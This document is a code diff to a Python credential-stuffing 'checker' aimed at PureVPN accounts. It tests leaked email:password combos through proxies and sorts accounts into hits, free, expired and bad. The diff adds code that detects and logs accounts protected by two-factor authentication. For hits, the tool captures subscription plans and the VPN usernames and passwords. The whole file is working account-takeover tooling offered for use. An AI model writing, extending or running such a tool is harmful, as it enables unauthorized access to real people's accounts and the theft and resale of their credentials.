@@ -17,6 +17,7 @@ TIMEOUT = 30
 checked = 0
 hits = 0
 free = 0
+two_fa = 0
 expired = 0
 bad = 0
 errors = 0
@@ -31,6 +32,7 @@ COMBOS_FILE = os.path.join(BASE_DIR, "combos.txt")
 PROXIES_FILE = os.path.join(BASE_DIR, "proxies.txt")
 HITS_FILE = os.path.join(BASE_DIR, "hits.txt")
 FREE_FILE = os.path.join(BASE_DIR, "free.txt")
+TWO_FA_FILE = os.path.join(BASE_DIR, "2fa.txt")
 EXPIRED_FILE = os.path.join(BASE_DIR, "expired.txt")
 
 CLIENT_ID = "a0724cd0-88bc-4326-a0ec-a2c210dfd908"
@@ -58,7 +60,7 @@ def update_title():
         elapsed = time.time() - start_time
         if elapsed > 0:
             cpm = int((checked / elapsed) * 60)
-        title = f"PureVPN Checker | Checked: {checked}/{total_combos} | Hits: {hits} | Free: {free} | Expired: {expired} | Bad: {bad} | CPM: {cpm}"
+        title = f"PureVPN Checker | Checked: {checked}/{total_combos} | Hits: {hits} | Free: {free} | 2FA: {two_fa} | Expired: {expired} | Bad: {bad} | CPM: {cpm}"
         ctypes.windll.kernel32.SetConsoleTitleW(title)
         time.sleep(0.5)
 
@@ -100,6 +102,7 @@ def log(status, message):
             "HIT": Fore.GREEN,
             "FREE": Fore.YELLOW,
             "EXPIRED": Fore.CYAN,
+            "2FA": Fore.BLUE,
             "BAD": Fore.RED,
             "ERROR": Fore.MAGENTA
         }
@@ -112,7 +115,7 @@ def save_hit(filename, content):
             f.write(content + "\n")
 
 def check_account(email, password):
-    global checked, hits, free, expired, bad, errors
+    global checked, hits, free, two_fa, expired, bad, errors
 
     for _ in range(RETRIES):
         session = requests.Session()
@@ -155,11 +158,27 @@ def check_account(email, password):
                 checked += 1
                 return
 
+            if "two-factor" in resp.text.lower() or "verification code" in resp.text.lower():
+                 two_fa += 1
+                 log("2FA", email)
+                 save_hit(TWO_FA_FILE, f"{email}:{password}")
+                 session.close()
+                 checked += 1
+                 return
+
             if resp.status_code != 302:
                 session.close()
                 continue 
 
             location = resp.headers.get("Location", "")
+            if "two-factor" in location:
+                two_fa += 1
+                log("2FA", email)
+                save_hit(TWO_FA_FILE, f"{email}:{password}")
+                session.close()
+                checked += 1
+                return
+
             if "code=" not in location:
                 bad += 1
                 log("BAD", f"{email} (No Code)")
@@ -215,6 +234,19 @@ def check_account(email, password):
             except ValueError:
                 session.close()
                 continue
+            
+            
+            u_data = userinfo_json.get("user", {})
+            tf_methods = u_data.get("twoFactor", {}).get("methods", [])
+            
+            
+            if len(tf_methods) > 0:
+                 two_fa += 1
+                 log("2FA", email)
+                 save_hit(TWO_FA_FILE, f"{email}:{password}")
+                 session.close()
+                 checked += 1
+                 return
 
             plans_list = []
             vpn_user = "N/A"
@@ -248,6 +280,16 @@ def check_account(email, password):
                                  "start_ts": p_start_ts,
                                  "source": "fusionauth_grant"
                              })
+
+                u_data = userinfo_json.get("user", {})
+                if u_data.get("twoFactorEnabled") or u_data.get("twoFactor", {}).get("enabled"):
+                     two_fa += 1
+                     log("2FA", email)
+                     save_hit(TWO_FA_FILE, f"{email}:{password}")
+                     session.close()
+                     checked += 1
+                     return
+
                              
                 b2c = userinfo_json.get("user", {}).get("data", {}).get("subscription", {}).get("b2c", [])
                 if b2c:
@@ -299,7 +341,7 @@ def check_account(email, password):
                     if p_expiry_ts:
                         p_expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(p_expiry_ts))
                     
-                    p_start_ts = data.get("start_date", 0)
+
 
                     is_free = data.get("is_free_user", False)
 
@@ -364,14 +406,13 @@ def check_account(email, password):
                 if str(name) in PLAN_MAP:
                     name = PLAN_MAP[str(name)]
                 else:
-                    # Fuzzy match fallback
                     n_lower = str(name).lower()
                     if "max" in n_lower:
                         name = "Max"
                     elif "plus" in n_lower:
                          name = "Plus"
-                    elif "standard" in n_lower or "plan" in n_lower: # "Plan Upgrade..." likely Standard or default
-                         name = "Standard"
+                    elif "standard" in n_lower or "plan" in n_lower: 
+                          name = "Standard"
                 
                 cycle = ""
                 if plan_item["expiry_ts"] and plan_item["start_ts"]:
@@ -409,7 +450,7 @@ def check_account(email, password):
             plan_string = ", ".join(final_plans)
             capture = f"Plan: {plan_string} | VPN User: {vpn_user} | VPN Pass: {vpn_pass}"
             line = f"{email}:{password} | {capture}"
-            # Mask password for logs
+            
             masked_pwd = "*" * 8
             masked_line = f"{email}:{masked_pwd} | {capture}"
             
@@ -506,7 +547,7 @@ $$ |      \$$$$$$  |$$ |      \$$$$$$$\   \$  /   $$$$$$$  |$$ |  $$ |      \$$$
         t.join()
 
     print(f"\n{Fore.GREEN}Finished Checking.{Style.RESET_ALL}")
-    print(f"{Fore.WHITE}Hits: {hits} | Free: {free} | Expired: {expired} | Bad: {bad} | Errors: {errors}{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}Hits: {hits} | Free: {free} | 2FA: {two_fa} | Expired: {expired} | Bad: {bad} | Errors: {errors}{Style.RESET_ALL}")
     input("Press Enter to Exit...")
 
 if __name__ == "__main__":
